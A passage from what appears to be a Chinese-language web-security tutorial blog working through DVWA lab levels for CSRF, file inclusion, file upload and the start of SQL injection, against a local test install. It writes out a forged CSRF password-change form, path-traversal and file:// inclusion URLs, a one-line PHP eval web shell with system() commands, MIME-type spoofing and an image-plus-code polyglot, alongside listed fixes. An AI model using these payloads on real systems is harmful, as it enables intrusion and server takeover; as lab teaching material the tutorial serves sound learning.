——&gt;ok</p><p>得出结论：<strong>referer只要包含host就能绕过限制</strong></p><p><strong>验证</strong>：referer修改为host——修改成功</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111305698.png" alt="1570111305698"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111317765.png" alt="1570111317765"></p><p><strong>攻击者思路</strong>：构造HTML——&gt;构造链接——&gt;诱骗受害者点击——&gt;受害者点击——&gt;攻击者登录</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111564798.png" alt="1570111564798"></p><p>这是第二步需要完成的</p><p>实战演示：</p><p>在xampp的根目录下建立一个<code>csrf.html</code>文件（apache的启动根目录是xampp/htdocs）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/dvwa-master/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Click Me&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器输入框输入：<code>127.0.0.1/csrf.html</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114591225.png" alt="1570114591225"></p><p>查看页面的源代码</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114683166.png" alt="1570114683166"></p><p>点击按钮后，跳转到DVWA下的csrf页面</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114638198.png" alt="1570114638198"></p><p>注意：该页面的路径要和<code>csrf.html</code>的路径是一致的</p><p>接下来我们使用Tamper Data进行改包，将浏览器后退一下，回到<code>csrf.htm</code>那个页面，然后start Tamper</p><p>点击“提交查询”，会有一个弹窗，</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570115942454.png" alt="1570115942454"></p><p>点击<code>ok</code>后，</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116268578.png" alt="1570116268578"></p><p>修改完成后，点击<code>ok</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116306293.png" alt="1570116306293"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116115630.png" alt="1570116115630"></p><p>中等安全等级</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116867444.png" alt="1570116867444"></p><p>联想上一次的破解</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116886525.png" alt="1570116886525"></p><p>如何解决呢？</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116905515.png" alt="1570116905515"></p><p><code>CSRF Token：</code>我们称这种类型的随机参数为csrf token，它保证了攻击者无法猜测到所有参数</p><p>为什么暴力破解可以突破csrf token？</p><p><strong>解释：</strong>因为构造HTTP请求的人不一样，暴力破解的<strong>攻击者是当前用户</strong>，受害者是其他用户；CSRF的攻击者是其他用户，<strong>受害者是当前用户</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570117140675.png" alt="1570117140675"></p><p><strong>修复：</strong></p><ol><li>校验referer（Medium等级）</li><li>随即Token（High等级）</li><li>验证码</li></ol><h2 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5 文件包含"></a>5 文件包含</h2><p>指：一种代码处理方法，函数如include、require等，<strong>参数是文件名</strong></p><p><strong>文件包含漏洞：</strong>文件名参数用户可控且过滤不严，<strong>被攻击者偷梁换柱</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570417499370.png" alt="1570417499370"></p><h3 id="Low等级操作"><a href="#Low等级操作" class="headerlink" title="Low等级操作"></a>Low等级操作</h3><p>工具：firefox、hackbar、DVWA</p><p>进行文件1、2、3的操作</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418812619.png" alt="1570418812619"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418836117.png" alt="1570418836117"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418851900.png" alt="1570418851900"></p><p>三个文件，只有参数中的<strong>page</strong>发生了变化</p><p><strong>尝试</strong>：将<code>test.php</code>给page——报错</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418963883.png" alt="1570418963883"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418985713.png" alt="1570418985713"></p><p>大致的意思我们找不到这个文件，但是我们有一个很大的收获，那就是<strong>暴露了web的绝对路径</strong></p><p><strong>思考</strong>：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=xxx.php</code>中变化的只是<strong>page=xxx.php</strong>，说明php文件都是在一个路径下的，变的只是文件名而已。</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570419291969.png" alt="1570419291969"></p><p>通过测试我们找到了文件的物理路径了，即<code>include(&quot;F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\vulnerabilities\fi\xxx.php &quot;)</code>,所以<strong>xxx.php</strong>是我们<strong>可控</strong>字段，之前的都是<strong>固定</strong>字段。</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570419484433.png" alt="1570419484433"></p><h4 id="攻击——本地文件读取"><a href="#攻击——本地文件读取" class="headerlink" title="攻击——本地文件读取"></a><strong>攻击——本地文件读取</strong></h4><p><strong>读取</strong>：<code>F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\php.ini</code>的内容</p><p><code>include(&quot;F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\php.ini&quot;)</code></p><p>==include(“F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\vulnerabilities\fi\==…/…/php.ini”)</p><p>黄色为固定字段，后面的是可控字段</p><p>验证：访问原始内容——文件包含内容——成功读取</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570420011680.png" alt="1570420011680"></p><p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=../../php.ini</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425105406.png" alt="1570425105406"></p><h4 id="攻击——本地文件执行"><a href="#攻击——本地文件执行" class="headerlink" title="攻击——本地文件执行"></a><strong>攻击——本地文件执行</strong></h4><p>读取其他目录的PHP脚本会怎么样？</p><p>显示内容还是执行PHP代码？</p><p><strong>验证</strong>：原始内容——文件包含内容——成功执行</p><p>在dvwa根目录下有一个<code>phpinfo.php</code>文件，可以显示服务端相关的配置信息</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425586418.png" alt="1570425586418"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425607769.png" alt="1570425607769"></p><p><code>http://localhost/dvwa-master/vulnerabilities/fi/?page=../../phpinfo.php</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425814698.png" alt="1570425814698"></p><p>显示的内容是一样的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425924848.png" alt="1570425924848"></p><h4 id="攻击——远程文件执行"><a href="#攻击——远程文件执行" class="headerlink" title="攻击——远程文件执行"></a><strong>攻击——远程文件执行</strong></h4><p>这个文件可以在任何地方？</p><p>只要有PHP代码的文件都会执行</p><p><strong>验证</strong>：原始内容——文件包含内容——成功执行</p><p>与dvwa在同一个目录网站下的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570426248681.png" alt="1570426248681"></p><p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=http://127.0.0.1/test.php</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570426399482.png" alt="1570426399482"></p><p><strong>问题：</strong></p><p>远程攻击执行不是在攻击者的 web’服务器上执行，因为并没有啥意义，我们期待在受害者的web上执行，所以<code>phpinfo.txt</code>才是正解</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427183009.png" alt="1570427183009"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427192412.png" alt="1570427192412"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427206436.png" alt="1570427206436"></p><h4 id="攻击者思路"><a href="#攻击者思路" class="headerlink" title="攻击者思路"></a>攻击者思路</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427343490.png" alt="1570427343490"></p><p>上面的操作都是在Low等级下完成的，下面进行Medium等级下的操作</p><h3 id="Medium等级操作"><a href="#Medium等级操作" class="headerlink" title="Medium等级操作"></a>Medium等级操作</h3><h4 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h4><p>Low方法失效，<strong>过滤了某些字符</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428587230.png" alt="1570428587230"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428644583.png" alt="1570428644583"></p><p>中级是将<code>../</code>过滤了，即上面的截图前三个都可以用，最后一个不可以用，此时我们使用<strong>反斜杠</strong><code>..\</code></p><p>验证：</p><p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/ ?page=..\..\php.ini</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428837625.png" alt="1570428837625"></p><h4 id="远程文件执行"><a href="#远程文件执行" class="headerlink" title="远程文件执行"></a>远程文件执行</h4><p>Low方法失效，<strong>过滤了某些字符</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428987783.png" alt="1570428987783"></p><p>通过验证发现，过滤的字符串是<code>http://</code>这个完整的字符串<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429245971.png" alt="1570429245971"></p><p>前三个不会被过滤掉的，只过滤最后一个</p><p><strong>解决方法：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429292776.png" alt="1570429292776"></p><h3 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h3><p>Low和Medium都失败</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429758076.png" alt="1570429758076"></p><p>通过不断探索，发现他过滤了某些字符串,<code>file*</code></p><h4 id="攻击——本地文件读取-1"><a href="#攻击——本地文件读取-1" class="headerlink" title="攻击——本地文件读取"></a>攻击——本地文件读取</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429871350.png" alt="1570429871350"></p><p><strong>方法：</strong></p><p><code>file://</code>——file协议，文件传输协议，访问<strong>本地</strong>计算机中的文件</p><p>操作：在file://后面添加上<strong>物理地址</strong>即可</p><p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/ ?page=file://F:/Tools/phpDevelop/XMAPP/htdocs/DVWA-master/phpinfo.php</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570430379303.png" alt="1570430379303"></p><p>通过测试file://F:/Tools/phpDevelop/XMAPP/htdocs/DVWA-master/phpinfo.php也是可以的</p><p>当然我们也可以读取<strong>系统的文件</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570430582610.png" alt="1570430582610"></p><h4 id="攻击——远程文件执行-1"><a href="#攻击——远程文件执行-1" class="headerlink" title="攻击——远程文件执行"></a>攻击——远程文件执行</h4><p>==由于必须file开头，无法远程文件执行==</p><p>需要结合文件上传漏洞，然后进行本地文件执行</p><h4 id="攻击者思路-1"><a href="#攻击者思路-1" class="headerlink" title="攻击者思路"></a>攻击者思路</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431220753.png" alt="1570431220753"></p><h2 id="6文件上传"><a href="#6文件上传" class="headerlink" title="6文件上传"></a>6文件上传</h2><p>举例</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431431587.png" alt="1570431431587"></p><p>web中常见功能，将本地文件上传到<strong>服务器</strong>上</p><p>web允许用户上传恶意代码文件，并在<strong>服务器</strong>上运行</p><p>类似代码</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431699122.png" alt="1570431699122"></p><p>工具：firefox、DVWA、hackbar、proxy switcher、owasp zap</p><p>对于陌生的页面，一个字：试，使劲的试</p><h3 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h3><p>正常操作：xxx.png——选择——上传</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570433159021.png" alt="1570433159021"></p><p>现在:研究下路径，将其与浏览器的地址与其拼接</p><p><code>http://localhost/dvwa-master/vulnerabilities/upload/../../hackable/uploads/640.PNG </code></p><p>用<code>../与../</code>与前面的路径进行消除操作，变为了</p><p>==<code>http://localhost/dvwa-master/hackable/uploads/640.PNG </code>，==而事实也确实是这样的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434108789.png" alt="1570434108789"></p><p><strong>访问</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434200024.png" alt="1570434200024"></p><p>接下来进行非正常的操作</p><p>尝试：phpinfo.php——上传——成功执行</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434459629.png" alt="1570434459629"></p><p>成功说明存在漏洞</p><p><strong>攻击</strong>：cmd.php——上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434663812.png" alt="1570434663812"></p><p>上传成功</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434690343.png" alt="1570434690343"></p><p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=phpinfo();</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434753992.png" alt="1570434753992"></p><p>我们接下来使用<strong>系统命令</strong></p><p><strong>①</strong>使用php中<code>system</code>函数，可以调用cmd中的命令，使用下面的url，可以知道<strong>当前文件的物理路径</strong></p><p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;dir&#39;);</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570435749048.png" alt="1570435749048"></p><p><strong>②</strong>查看文件：</p><p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;type F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\robots.txt &#39;);</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436066256.png" alt="1570436066256"></p><p>注意有时候会<strong>转义</strong><code>\</code>，所以会写成两个反斜杠<code>\\</code>,即上面的URL改写成</p><p><code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;type F:\\Tools\\phpDevelop\\XMAPP\\htdocs\\DVWA-master\\robots.txt &#39;);</code></p><h3 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436347021.png" alt="1570436347021"></p><p>不允许上传，low方法失败</p><p>How to 解决呢？</p><p><strong>思考：转包看一看</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436432746.png" alt="1570436432746"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436477975.png" alt="1570436477975"></p><p><strong>对比法</strong>：将成功和失败的包进行对比</p><p>成功包</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437589260.png" alt="1570437589260"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437679373.png" alt="1570437679373"></p><p>失败包</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437718296.png" alt="1570437718296"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437769717.png" alt="1570437769717"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437873496.png" alt="1570437873496"></p><p>我们来分析下</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437947967.png" alt="1570437947967"></p><p>成功的内容</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438177190.png" alt="1570438177190"></p><p>失败的内容</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438345506.png" alt="1570438345506"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438433491.png" alt="1570438433491"></p><p>不断尝试——修改重新发送——确认文件类型</p><p><strong>攻击：</strong>上传php文件，抓包后，修改文件类型为<code>image/jpeg(png)</code>,然后点击发送</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570439067716.png" alt="1570439067716"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570439180237.png" alt="1570439180237"></p><h3 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a>High等级</h3><p>低和中级都是失败的</p><p>方法还是一样的，通过抓包对比</p><p>我们发现最终是<code>文件后缀和文件内容</code>被限制了</p><p>尝试：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570440694637.png" alt="1570440694637"></p><p>==制作“内涵图”==</p><p><code>1.jpg</code></p><p><code>1.txt</code>:写入我们PHP代码</p><p><code>2.jpg</code>：使用cmd将其合并到2.jpg中，看起来不会有什么变化</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441033767.png" alt="1570441033767"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441076116.png" alt="1570441076116"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441098078.png" alt="1570441098078"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441310307.png" alt="1570441310307"></p><p><code>copy 1.PNG/b+1.txt/a 2.PNG</code>    （b:二进制文件；a:文本文件）</p><blockquote><p><strong>合并文本文件。</strong></p><p>复制命令的隐藏功能就是可以将多个文件合并到一起。这对于处理纯文本文件时是很有帮助的。使用以下命令，可以将第一个和第二个文件中的内容合并在一起，生成一个新文件。复制命令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 文件1.txt+文件2.txt 新文件.txt</span><br></pre></td></tr></table></figure><ul><li>这个命令假定文件1.txt和文件2.txt都位于当前路径下。如果文件位于其它路径中，你需要在每个文件名的前面加上文件所在的路径。</li></ul></blockquote><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570442532851.png" alt="1570442532851"></p><p>验证：</p><p><strong>文件包含漏洞high等级</strong>：</p><p>合则分生则死</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448144391.png" alt="1570448144391"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448238094.png" alt="1570448238094"></p><h3 id="impossible等级"><a href="#impossible等级" class="headerlink" title="impossible等级"></a>impossible等级</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448852499.png" alt="1570448852499"></p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><ul><li>阻止非法文件上传</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570449034120.png" alt="1570449034120"></p><ul><li>阻止非法文件执行<ul><li>文件重命名</li><li>文件压缩重生成</li><li>存储目录执行权限</li><li>存储目录与web分离</li></ul></li></ul><h2 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7  SQL注入"></a>7  SQL注入</h2><ul><li>命令注入:</li><li>SQL注入:</li></ul><p>SQL<strong>回显注入</strong>：数据库的执行结果直接<strong>显示到页面</strong>上</p><p>工具：firefox、dvwa、hackbar、firebug、tamper data、sqlmap<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570451783504.png" alt="1570451783504"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570451765570.png" alt="1570451765570"></p><p>SQL注入猜测：</p><p><code>select firstname,sunname from xxx where userid=&quot;我们输入的id&quot;</code></p><p>探测是否存在漏洞:输入1’——提交——错误回显</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453597897.png" alt="1570453597897"></p><h3 id="三种注入POC"><a href="#三种注入POC" class="headerlink" title="三种注入POC"></a><strong>三种注入POC</strong></h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453663573.png" alt="1570453663573"></p><p><strong>确认注入POC</strong>：</p><ul><li>1 or  1024=1024</li></ul><p><img 